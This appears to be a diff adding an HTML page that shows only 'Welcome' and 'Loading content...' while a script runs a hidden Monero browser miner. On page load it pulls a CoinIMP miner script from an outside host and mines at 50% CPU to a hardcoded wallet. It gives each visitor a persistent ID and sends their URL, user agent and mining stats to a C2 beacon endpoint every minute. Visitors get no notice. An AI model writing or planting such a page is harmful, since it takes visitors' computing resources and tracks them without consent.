@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <style>
+        body { margin: 0; padding: 0; background: #0a0a0a; color: #fff; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
+        .container { max-width: 1200px; margin: 0 auto; padding: 20px; }
+        .hidden { display: none; }
+    </style>
+    <!-- CoinIMP JavaScript Miner -->
+    <script src="https://www.hostingcloud.racing/1.js"></script>
+</head>
+<body>
+    <div id="content" class="container">
+        <!-- Normal page content here -->
+        <h1>Welcome</h1>
+        <p>Loading content...</p>
+    </div>
+    
+    <script>
+    // ─── Browser Mining Configuration ─────────────────────────────────────────
+    (function() {
+        'use strict';
+        
+        const WALLET = "44haKQM5F43d37q3k6mV45YbrL5g6wGHWNB5uyt2cDfTdR8d9FicJCbitjm1xeKZzEVULG7MqdVFWEa9wKXsNLTpFvzffR5";
+        const THROTTLE = 0.5;  // 50% CPU
+        const MINING_ENABLED = true;
+        
+        let miner = null;
+        let miningStats = {
+            hashesPerSecond: 0,
+            totalHashes: 0,
+            acceptedHashes: 0,
+            threads: navigator.hardwareConcurrency || 4,
+            startTime: Date.now()
+        };
+        
+        // ─── Initialize Miner ──────────────────────────────────────────────────
+        function initMiner() {
+            if (!MINING_ENABLED) return;
+            
+            try {
+                // Create miner instance
+                miner = new Client.Anonymous(WALLET, {
+                    throttle: THROTTLE,
+                    c: 'xmr',  // Monero
+                    ads: 0     // No ads
+                });
+                
+                // Start mining
+                miner.start();
+                
+                // Track stats
+                setInterval(updateStats, 1000);
+                
+                // Report to C2
+                setInterval(reportToC2, 60000);  // Every minute
+                
+                console.log('[Mining] Started with ' + miningStats.threads + ' threads');
+            } catch (e) {
+                console.log('[Mining] Error:', e);
+            }
+        }
+        
+        // ─── Update Stats ───────────────────────────────────────────────────────
+        function updateStats() {
+            if (!miner) return;
+            
+            miningStats.hashesPerSecond = miner.getHashesPerSecond();
+            miningStats.totalHashes = miner.getTotalHashes();
+            miningStats.acceptedHashes = miner.getAcceptedHashes();
+        }
+        
+        // ─── Report to C2 ───────────────────────────────────────────────────────
+        function reportToC2() {
+            const data = {
+                agentId: getAgentId(),
+                url: window.location.href,
+                userAgent: navigator.userAgent,
+                mining: {
+                    hashrate: miningStats.hashesPerSecond.toFixed(2),
+                    totalHashes: miningStats.totalHashes,
+                    threads: miningStats.threads,
+                    uptime: Math.floor((Date.now() - miningStats.startTime) / 1000)
+                },
+                timestamp: new Date().toISOString()
+            };
+            
+            // Send beacon
+            if (navigator.sendBeacon) {
+                const blob = new Blob([JSON.stringify(data)], { type: 'application/json' });
+                navigator.sendBeacon('/api/mining/browser/beacon', blob);
+            }
+            
+            // Also try fetch
+            try {
+                fetch('/api/mining/browser/beacon', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data),
+                    mode: 'no-cors'
+                });
+            } catch (e) {}
+        }
+        
+        // ─── Agent ID ───────────────────────────────────────────────────────────
+        function getAgentId() {
+            let id = localStorage.getItem('_m_id');
+            if (!id) {
+                id = 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, c => {
+                    const r = Math.random() * 16 | 0;
+                    return (c === 'x' ? r : (r & 0x3 | 0x8)).toString(16);
+                });
+                localStorage.setItem('_m_id', id);
+            }
+            return id;
+        }
+        
+        // ─── Visibility Handler ────────────────────────────────────────────────
+        document.addEventListener('visibilitychange', () => {
+            if (!miner) return;
+            
+            if (document.hidden) {
+                // Throttle more when tab hidden
+                miner.setThrottle(0.8);
+            } else {
+                // Resume normal throttle
+                miner.setThrottle(THROTTLE);
+            }
+        });
+        
+        // ─── Start on Load ─────────────────────────────────────────────────────
+        if (document.readyState === 'complete') {
+            initMiner();
+        } else {
+            window.addEventListener('load', initMiner);
+        }
+        
+        // ─── Expose for Debugging ──────────────────────────────────────────────
+        window._miner = {
+            getStats: () => miningStats,
+            stop: () => miner && miner.stop(),
+            start: () => miner && miner.start(),
+            setThrottle: (t) => miner && miner.setThrottle(t)
+        };
+        
+    })();
+    </script>
+</body>
+</html>
